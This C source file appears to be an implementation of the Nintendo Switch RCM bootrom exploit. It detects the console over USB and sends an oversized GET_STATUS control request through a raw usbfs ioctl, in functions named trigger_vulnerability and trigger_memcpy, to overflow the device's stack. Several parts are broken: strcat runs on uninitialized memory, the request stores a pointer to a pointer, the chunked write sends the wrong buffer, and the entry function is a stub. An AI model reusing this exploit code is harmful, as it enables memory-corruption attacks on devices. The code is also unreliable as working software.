#include "inject.h"

DeviceInfo* get_device_info(libusb_device_handle* handle) {
  DeviceInfo* ret = malloc(sizeof(DeviceInfo));
  libusb_device* dev = libusb_get_device(handle);
  ret->handle = handle;
  ret->bus = libusb_get_bus_number(dev);
  ret->addr = libusb_get_device_address(dev);
  return ret;
}


unsigned char* build_packet(size_t len) {
  unsigned char* ret = malloc(sizeof(char) *
			      (PACKET_SIZE + len));
  memset(ret, 0, PACKET_SIZE + len);
  ret[0] = (unsigned char)(STD_REQ_DEV_TOH_TOE);
  ret[1] = (unsigned char)(GET_STATUS);
  ret[6] = (len >> 8) & 0xff;
  ret[7] = len & 0xff;
  
  return ret;
}

char* pad_number(int n) {
  char* ret = malloc(sizeof(char) * 4);
  if (n < 10) {
    sprintf(ret, "00%d", n);
    return ret;
  }
  if (n < 100) {
    sprintf(ret, "0%d", n);
    return ret;
  }
  sprintf(ret, "%d", n);
  return ret;
}

char* format_usb_path(int bus, int addr) {
  char* path = malloc(sizeof(char) * 21);
  strcat(path, "/dev/bus/usb/");
  char* first_format = pad_number(bus);
  strcat(path, first_format);
  strcat(path, "/");
  char* second_format = pad_number(addr);
  strcat(path, second_format);
  free(first_format);
  free(second_format);
  return path;
}

SubmitURBIoctl*
build_request(unsigned char* buf, size_t len) {
  SubmitURBIoctl* request =
    malloc(sizeof(SubmitURBIoctl));
  request->type = URB_CTRL_REQ;
  request->endpoint = 0;
  request->buffer = &buf;
  request->buffer_length = len;
  return request;
}

int get_ioctl_number(SubmitURBIoctl* request) {
  return (IOCTL_IOR |
	  (sizeof(request) << 16) |
	  (((size_t) 'U') << 8) |
	  IOCTL_NR_SUBMIT_URB);
}

int submit_request(int reqnum, char* path,
		    SubmitURBIoctl* request) {
  int fd = open(path, O_RDWR);
  int status = ioctl(fd, reqnum, request);
  close(fd);
  free(request);
  return status;
}

int nx_count = 0; //1 if present.
libusb_device_handle* nx_handle; // the nx device once it's been found
int __internal_event_callback(struct libusb_context* c,
			      struct libusb_device* dev,
			      libusb_hotplug_event ev,
			      void* data) {
  static libusb_device_handle *dev_handle = NULL;
  struct libusb_device_descriptor desc;
  int rc;
  libusb_get_device_descriptor(dev, &desc);
  if (ev == LIBUSB_HOTPLUG_EVENT_DEVICE_ARRIVED) {
    rc = libusb_open(dev, &dev_handle);
    if (rc != LIBUSB_SUCCESS) {
      fprintf(stderr, "FAILED TO OPEN THE NX DEVICE\n");
      return 0;
    }
    nx_count++;
    nx_handle = dev_handle;
    return 0;
  }
  if (ev == LIBUSB_HOTPLUG_EVENT_DEVICE_LEFT) {
    nx_count--;
    if (dev_handle) {
      libusb_close(dev_handle);
      dev_handle = NULL;
    }
    return 0;
  }
  return 0;
}

void wait_for_nx() {
  libusb_hotplug_callback_handle nx_wait;
  int rc =
    libusb_hotplug_register_callback(NULL,
				     LIBUSB_HOTPLUG_EVENT_DEVICE_ARRIVED |
				     LIBUSB_HOTPLUG_EVENT_DEVICE_LEFT,
				     0, NX_VID, NX_PID,
				     LIBUSB_HOTPLUG_NO_FLAGS,
				     __internal_event_callback,
				     NULL, &nx_wait);
  if (rc != LIBUSB_SUCCESS) {
    fprintf(stderr, "Fatal error: FAILED TO CREATE A LIBUSB CALLBACK");
    libusb_exit(NULL);
    exit(1);
  }

  while (nx_count < 1) {
    printf("waiting for the NX...\n");
    libusb_handle_events_completed(NULL, NULL);
  }
}


unsigned char* read_bytes(libusb_device_handle* handle,
			  int len, int* rc) {
  unsigned char* ret = malloc(sizeof(char) * 1000);
  int total;
  *rc = libusb_bulk_transfer(handle, 0x81, ret,
			     len, &total, 1000);

  if (*rc == 0) return ret;
  if (*rc == LIBUSB_ERROR_NO_DEVICE) {
    fprintf(stderr, "THE NX HAS DISCONNECTED!\n");
    return NULL;
  }
  if (*rc == LIBUSB_ERROR_TIMEOUT) {
    fprintf(stderr, "TRANSFER TIMEOUT (reading)\n");
    return NULL;
  }
  fprintf(stderr, "UNKNOWN ERROR ON NX TRANSFER (reading)\n");
  return NULL;
}

void write_bytes(libusb_device_handle* handle,
		 unsigned char* data, int len, int* rc) {
  int total;
  *rc = libusb_bulk_transfer(handle, 0x01, data,
			     len, &total, 1000);
}

DeviceInfo* setup_connection() {
  int cur_buf = 0;
  size_t total_written = 0;
  libusb_device_handle* handle =
    libusb_open_device_with_vid_pid(NULL, NX_VID, NX_PID);
  wait_for_nx();
  DeviceInfo* info = get_device_info(nx_handle);
  printf("NX FOUND!\n");
  return info;
}
int cur_cpy_buf = 0;
void write_to_rcm(libusb_device_handle* handle,
		  unsigned char* data, int len) {
  int packet_size = 0x1000;
  while (len > 0) {
    int to_transmit = (packet_size < len) ? packet_size : len;
    unsigned char* chunk = malloc(sizeof(char) * to_transmit);
    memcpy(chunk, data, to_transmit);
    data = data + to_transmit;
    len -= to_transmit;
    cur_cpy_buf = 1 - cur_cpy_buf;
    int status;
    write_bytes(handle, data, len, &status);
  }
}

size_t get_current_buf() { return CPY_BUF_ADDR(cur_cpy_buf); }

unsigned char*
read_device_id(libusb_device_handle* handle) {
  int unused;
  return read_bytes(handle, 16, &unused);
}

size_t trigger_vulnerability(DeviceInfo* info, size_t length) {
  char* path = format_usb_path(info->bus, info->addr);
  unsigned char* packet = build_packet(length);
  SubmitURBIoctl* request = build_request(packet, length);
  int ioctlnum = get_ioctl_number(request);
  int status = submit_request(ioctlnum, path, request);

  free(request);
  free(packet);
  free(path);
}

void switch_to_highbuf(libusb_device_handle* handle) {
  if (get_current_buf() == CPY_BUF_ADDR(1)) return;
  unsigned char* data = malloc(0x1000 * sizeof(unsigned char));
  memset(data, '\0', 0x1000);
  int unused;
  write_bytes(handle, data, 0x1000, &unused);
}

void trigger_memcpy(DeviceInfo* info, size_t length) {
  if (length == 0) {
    length = STACK_END - get_current_buf();
  }
  trigger_vulnerability(info, length);
}

void hax() {
  wait_for_nx();
  printf("found the Console!\n");
}
